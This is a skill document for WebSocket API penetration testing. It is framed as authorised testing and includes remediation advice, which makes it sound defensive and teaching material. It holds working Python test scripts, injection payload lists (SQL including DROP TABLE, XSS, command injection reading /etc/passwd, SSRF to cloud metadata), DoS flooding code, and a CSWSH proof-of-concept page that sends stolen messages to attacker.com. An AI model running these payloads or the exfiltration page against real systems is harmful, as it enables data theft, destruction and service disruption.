---
name: testing-websocket-api-security
description: >
  Tests WebSocket API implementations for security vulnerabilities including missing
  authentication on WebSocket upgrade, Cross-Site WebSocket Hijacking (CSWSH), injection
  attacks through WebSocket messages, insufficient input validation, denial-of-service via
  message flooding, and information leakage through WebSocket frames. The tester intercepts
  WebSocket handshakes and messages using Burp Suite, crafts malicious payloads, and tests
  for authorization bypass on WebSocket channels. Activates for requests involving WebSocket
  security testing, WS penetration testing, CSWSH attack, or real-time API security assessment.
domain: cybersecurity
subdomain: api-security
tags: [api-security, websocket, cswsh, real-time, injection, authentication]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Testing WebSocket API Security

## When to Use

- Assessing real-time communication APIs that use WebSocket (ws://) or Secure WebSocket (wss://) protocols
- Testing for Cross-Site WebSocket Hijacking (CSWSH) where an attacker's page connects to a legitimate WebSocket server
- Evaluating authentication and authorization enforcement on WebSocket connections and messages
- Testing input validation on WebSocket message payloads for injection vulnerabilities
- Assessing WebSocket implementations for denial-of-service through message flooding or oversized frames

**Do not use** without written authorization. WebSocket testing may disrupt real-time services and affect other connected users.

## Prerequisites

- Written authorization specifying the WebSocket endpoint and testing scope
- Burp Suite Professional with WebSocket interception capability
- Python 3.10+ with `websockets` and `asyncio` libraries
- Browser developer tools for observing WebSocket handshakes and frames
- wscat CLI tool for manual WebSocket interaction: `npm install -g wscat`
- Knowledge of the WebSocket subprotocol in use (JSON-RPC, STOMP, custom)

## Workflow

### Step 1: WebSocket Endpoint Discovery and Handshake Analysis

```python
import asyncio
import websockets
import json
import ssl
import time

WS_URL = "wss://target-api.example.com/ws"
AUTH_TOKEN = "Bearer <token>"

# Capture and analyze the WebSocket handshake
async def analyze_handshake():
    """Analyze WebSocket upgrade request and response headers."""
    try:
        async with websockets.connect(
            WS_URL,
            extra_headers={"Authorization": AUTH_TOKEN},
            ssl=ssl.create_default_context()
        ) as ws:
            print(f"Connected to: {WS_URL}")
            print(f"Protocol: {ws.subprotocol}")
            print(f"Extensions: {ws.extensions}")

            # Send a test message
            test_msg = json.dumps({"type": "ping"})
            await ws.send(test_msg)
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"Server response: {response}")

            return True
    except websockets.exceptions.InvalidStatusCode as e:
        print(f"Connection rejected: {e.status_code}")
        return False
    except Exception as e:
        print(f"Connection error: {e}")
        return False

asyncio.run(analyze_handshake())
```

### Step 2: Authentication and Authorization Testing

```python
async def test_ws_authentication():
    """Test if WebSocket requires authentication."""
    results = []

    # Test 1: Connect without any authentication
    try:
        async with websockets.connect(WS_URL) as ws:
            await ws.send(json.dumps({"type": "get_user_data"}))
            resp = await asyncio.wait_for(ws.recv(), timeout=5)
            results.append({
                "test": "No authentication",
                "status": "VULNERABLE",
                "response": resp[:200]
            })
            print(f"[VULN] WebSocket accessible without authentication")
    except websockets.exceptions.InvalidStatusCode:
        results.append({"test": "No authentication", "status": "SECURE"})
    except Exception as e:
        results.append({"test": "No authentication", "status": f"ERROR: {e}"})

    # Test 2: Connect with invalid token
    try:
        async with websockets.connect(WS_URL,
            extra_headers={"Authorization": "Bearer invalid_token"}) as ws:
            await ws.send(json.dumps({"type": "get_user_data"}))
            resp = await asyncio.wait_for(ws.recv(), timeout=5)
            results.append({
                "test": "Invalid token",
                "status": "VULNERABLE",
                "response": resp[:200]
            })
    except websockets.exceptions.InvalidStatusCode:
        results.append({"test": "Invalid token", "status": "SECURE"})
    except Exception as e:
        results.append({"test": "Invalid token", "status": f"ERROR: {e}"})

    # Test 3: Connect with expired token
    expired_token = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDAwMDAwMDB9.expired"
    try:
        async with websockets.connect(WS_URL,
            extra_headers={"Authorization": expired_token}) as ws:
            await ws.send(json.dumps({"type": "get_user_data"}))
            resp = await asyncio.wait_for(ws.recv(), timeout=5)
            results.append({"test": "Expired token", "status": "VULNERABLE"})
    except (websockets.exceptions.InvalidStatusCode, Exception):
        results.append({"test": "Expired token", "status": "SECURE"})

    # Test 4: Token in query parameter (leakage risk)
    try:
        async with websockets.connect(f"{WS_URL}?token={AUTH_TOKEN}") as ws:
            await ws.send(json.dumps({"type": "ping"}))
            resp = await asyncio.wait_for(ws.recv(), timeout=5)
            results.append({
                "test": "Token in URL",
                "status": "INFO - Token accepted in query parameter (may leak in logs)"
            })
    except Exception:
        results.append({"test": "Token in URL", "status": "REJECTED"})

    for r in results:
        print(f"  [{r['status'][:10]}] {r['test']}")

    return results

asyncio.run(test_ws_authentication())
```

### Step 3: Cross-Site WebSocket Hijacking (CSWSH) Testing

```python
async def test_cswsh():
    """Test for Cross-Site WebSocket Hijacking vulnerability."""
    # CSWSH occurs when the WebSocket server does not validate the Origin header
    # An attacker's website can connect to the legitimate WebSocket and steal data

    origins_to_test = [
        None,                                    # No Origin header
        "https://evil.com",                      # Attacker domain
        "https://target-api.example.com.evil.com",  # Subdomain confusion
        "null",                                  # Null origin (sandboxed iframe)
        "https://target-api.example.com",        # Legitimate origin
        "http://target-api.example.com",         # HTTP downgrade
    ]

    print("=== CSWSH Testing ===\n")
    for origin in origins_to_test:
        try:
            headers = {"Authorization": AUTH_TOKEN}
            if origin:
                headers["Origin"] = origin

            async with websockets.connect(WS_URL, extra_headers=headers) as ws:
                # Try to receive data that should be restricted
                await ws.send(json.dumps({"type": "get_messages"}))
                resp = await asyncio.wait_for(ws.recv(), timeout=5)

                if origin and origin != "https://target-api.example.com":
                    print(f"[CSWSH] Origin '{origin}' -> ACCEPTED (data received)")
                else:
                    print(f"[OK] Origin '{origin}' -> Accepted (legitimate)")
        except websockets.exceptions.InvalidStatusCode as e:
            print(f"[BLOCKED] Origin '{origin}' -> Rejected ({e.status_code})")
        except Exception as e:
            print(f"[ERROR] Origin '{origin}' -> {e}")

asyncio.run(test_cswsh())

# PoC HTML page for CSWSH exploitation
CSWSH_POC = """
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
// This page, hosted on attacker.com, connects to the target WebSocket
// If the server doesn't validate Origin, the victim's browser will
// send cookies/credentials and the attacker receives the data

var ws = new WebSocket("wss://target-api.example.com/ws");

ws.onopen = function() {
    console.log("Connected to target WebSocket");
    ws.send(JSON.stringify({type: "get_messages"}));
    ws.send(JSON.stringify({type: "get_user_data"}));
};

ws.onmessage = function(event) {
    console.log("Stolen data:", event.data);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/collect", {
        method: "POST",
        body: event.data
    });
};
</script>
<p>Loading... (CSWSH attack in progress)</p>
</body>
</html>
"""
```

### Step 4: WebSocket Message Injection Testing

```python
async def test_ws_injection():
    """Test WebSocket messages for injection vulnerabilities."""

    INJECTION_PAYLOADS = {
        "sql": [
            {"type": "search", "query": "' OR '1'='1"},
            {"type": "search", "query": "'; DROP TABLE messages;--"},
            {"type": "get_message", "id": "1 UNION SELECT username,password FROM users--"},
        ],
        "nosql": [
            {"type": "search", "query": {"$ne": ""}},
            {"type": "get_user", "filter": {"$gt": ""}},
        ],
        "xss": [
            {"type": "send_message", "content": "<script>alert('xss')</script>"},
            {"type": "send_message", "content": "<img src=x onerror=alert(1)>"},
            {"type": "update_name", "name": "Test<script>document.location='https://evil.com'</script>"},
        ],
        "command": [
            {"type": "process", "file": "test; cat /etc/passwd"},
            {"type": "convert", "input": "test | id"},
        ],
        "ssrf": [
            {"type": "load_url", "url": "http://169.254.169.254/latest/meta-data/"},
            {"type": "webhook", "callback": "http://localhost:6379/"},
        ],
        "overflow": [
            {"type": "send_message", "content": "A" * 100000},
            {"type": "search", "query": "B" * 1000000},
        ],
    }

    async with websockets.connect(WS_URL,
        extra_headers={"Authorization": AUTH_TOKEN}) as ws:

        for category, payloads in INJECTION_PAYLOADS.items():
            for payload in payloads:
                try:
                    await ws.send(json.dumps(payload))
                    resp = await asyncio.wait_for(ws.recv(), timeout=5)

                    # Analyze response for injection indicators
                    resp_lower = resp.lower()
                    indicators = []
                    if any(kw in resp_lower for kw in ["sql", "syntax", "mysql", "postgresql"]):
                        indicators.append("SQL error")
                    if any(kw in resp_lower for kw in ["root:", "uid=", "etc/passwd"]):
                        indicators.append("Command output")
                    if any(kw in resp_lower for kw in ["ami-id", "instance-id", "metadata"]):
                        indicators.append("SSRF data")
                    if "script" in resp_lower and "xss" not in category:
                        indicators.append("Reflected XSS")

                    if indicators:
                        print(f"[{category.upper()}] {json.dumps(payload)[:60]} -> {indicators}")
                    elif len(resp) > 10000:
                        print(f"[OVERFLOW] Large response: {len(resp)} bytes")
                except asyncio.TimeoutError:
                    pass
                except websockets.exceptions.ConnectionClosed:
                    print(f"[CRASH] Connection closed after {category} payload")
                    # Reconnect
                    break

asyncio.run(test_ws_injection())
```

### Step 5: Denial-of-Service Testing

```python
async def test_ws_dos():
    """Test WebSocket for DoS vulnerabilities."""
    print("=== WebSocket DoS Testing ===\n")

    # Test 1: Message flooding
    async def flood_test():
        async with websockets.connect(WS_URL,
            extra_headers={"Authorization": AUTH_TOKEN}) as ws:
            count = 0
            start = time.time()
            for i in range(10000):
                try:
                    await ws.send(json.dumps({"type": "ping", "id": i}))
                    count += 1
                except websockets.exceptions.ConnectionClosed:
                    break
            elapsed = time.time() - start
            print(f"  Flood test: {count} messages in {elapsed:.1f}s ({count/elapsed:.0f} msg/s)")

    await flood_test()

    # Test 2: Large message
    async def large_message_test():
        sizes = [1024, 10240, 102400, 1024000, 10240000]  # 1KB to 10MB
        async with websockets.connect(WS_URL,
            extra_headers={"Authorization": AUTH_TOKEN},
            max_size=20*1024*1024) as ws:
            for size in sizes:
                try:
                    large_msg = json.dumps({"type": "data", "payload": "A" * size})
                    await ws.send(large_msg)
                    resp = await asyncio.wait_for(ws.recv(), timeout=5)
                    print(f"  Large message ({size} bytes): Accepted")
                except (websockets.exceptions.ConnectionClosed, asyncio.TimeoutError) as e:
                    print(f"  Large message ({size} bytes): Rejected/Disconnected")
                    break

    await large_message_test()

    # Test 3: Connection exhaustion
    async def connection_exhaustion():
        connections = []
        for i in range(100):
            try:
                ws = await websockets.connect(WS_URL,
                    extra_headers={"Authorization": AUTH_TOKEN})
                connections.append(ws)
            except Exception:
                break
        print(f"  Connection exhaustion: {len(connections)} concurrent connections established")
        for ws in connections:
            await ws.close()

    await connection_exhaustion()

asyncio.run(test_ws_dos())
```

## Key Concepts

| Term | Definition |
|------|------------|
| **WebSocket** | Full-duplex communication protocol over a single TCP connection, established via HTTP upgrade handshake |
| **CSWSH** | Cross-Site WebSocket Hijacking - an attack where a malicious website initiates a WebSocket connection to a legitimate server using the victim's browser credentials |
| **Origin Validation** | Server-side check of the Origin header during WebSocket handshake to prevent CSWSH by rejecting connections from unauthorized domains |
| **WebSocket Frame** | The basic unit of data in WebSocket communication, containing opcode, masking, payload length, and payload data |
| **Upgrade Handshake** | HTTP request with `Upgrade: websocket` and `Connection: Upgrade` headers that establishes the WebSocket connection |
| **Message Flooding** | Sending a large volume of WebSocket messages to exhaust server resources (memory, CPU, bandwidth) |

## Tools & Systems

- **Burp Suite Professional**: Intercepts WebSocket handshakes and messages, allows message modification and replay
- **OWASP ZAP**: WebSocket testing with message fuzzing, interception, and breakpoint capabilities
- **wscat**: Command-line WebSocket client for manual testing: `wscat -c wss://target.com/ws -H "Authorization: Bearer token"`
- **websocat**: Advanced CLI WebSocket tool with proxy, broadcast, and scripting capabilities
- **Autobahn TestSuite**: Comprehensive WebSocket protocol compliance and security testing framework

## Common Scenarios

### Scenario: Chat Application WebSocket Security Assessment

**Context**: A messaging application uses WebSocket for real-time chat. The WebSocket endpoint handles message delivery, typing indicators, read receipts, and user presence. Authentication is cookie-based.

**Approach**:
1. Analyze the WebSocket handshake: connection established at `wss://chat.example.com/ws` with session cookie authentication
2. Test CSWSH: WebSocket server does not validate the Origin header - an attacker's page can connect and receive the victim's messages
3. Test authentication: WebSocket accepts connections with expired session cookies (session validation only at handshake, not for subsequent messages)
4. Test authorization: User A can send messages to private channels they are not a member of by crafting the channel ID
5. Test injection: Message content is stored without sanitization; XSS payload in message body executes in other users' browsers
6. Test message flooding: Server accepts 5000 messages per second without rate limiting, causing CPU spike
7. Find that WebSocket messages include the sender's internal user ID, email, and IP address (information leakage)

**Pitfalls**:
- Not testing CSWSH because the application uses token-based authentication (cookies are automatically sent with WebSocket)
- Only testing the initial handshake authentication without verifying ongoing message authorization
- Missing injection vulnerabilities because payloads are in JSON WebSocket frames instead of HTTP parameters
- Not testing reconnection behavior (does the server re-validate authentication on reconnect?)
- Ignoring that WebSocket connections may bypass HTTP-level rate limiting and WAF rules

## Output Format

```
## Finding: Cross-Site WebSocket Hijacking Enables Real-Time Data Theft

**ID**: API-WS-001
**Severity**: High (CVSS 8.1)
**Affected Endpoint**: wss://chat.example.com/ws

**Description**:
The WebSocket server does not validate the Origin header during the
handshake. An attacker can host a malicious web page that opens a
WebSocket connection to the chat server using the victim's session
cookie. All messages, typing indicators, and presence data are
forwarded to the attacker in real time.

**Proof of Concept**:
Host the CSWSH PoC page on attacker.com. When a logged-in user
visits the page, the JavaScript establishes a WebSocket connection
to the chat server. The server authenticates the connection using
the victim's cookie and delivers all real-time chat data to the
attacker's connection.

**Impact**:
Real-time interception of all private messages, presence data,
and typing indicators for any user who visits the attacker's page.

**Remediation**:
1. Validate the Origin header against an allowlist of legitimate domains
2. Implement CSRF tokens in the WebSocket handshake URL
3. Use token-based authentication (Authorization header) instead of cookies for WebSocket
4. Implement per-message authorization checks, not just connection-level authentication
5. Add rate limiting on WebSocket message volume per connection
```
